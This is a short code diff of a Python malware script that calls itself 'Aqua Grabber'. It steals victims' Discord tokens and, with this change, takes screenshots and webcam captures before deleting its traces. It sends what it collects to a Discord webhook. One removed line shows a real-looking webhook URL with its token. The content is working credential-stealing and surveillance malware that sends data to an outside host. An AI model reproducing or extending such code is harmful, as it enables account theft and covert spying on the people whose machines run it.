@@ -278,7 +278,7 @@ def cleanUp():
     shutil.rmtree(Aqua)
 
 
-webhook_url = 'https://discord.com/api/webhooks/1181292565551656960/CKgsPF6b19sUj6cKdxdOl0PDBWi_IeArbn887nBygG1JCmCTuj3Cg3-kg1bcaNtHlpfq'
+webhook_url = 'Webhook_here'
 webhook = DiscordWebhook(url=webhook_url)
 embed = DiscordEmbed()
 webhook.username = "Aqua Grabber"
@@ -287,7 +287,10 @@ webhook.avatar_url = "https://cdn.discordapp.com/attachments/1179144552154673252
 
 def runAqua():
     makeDir()
+    takeSS()
+    getCam()
     getDcToken()
+    cleanUp()
 
 
 runAqua()
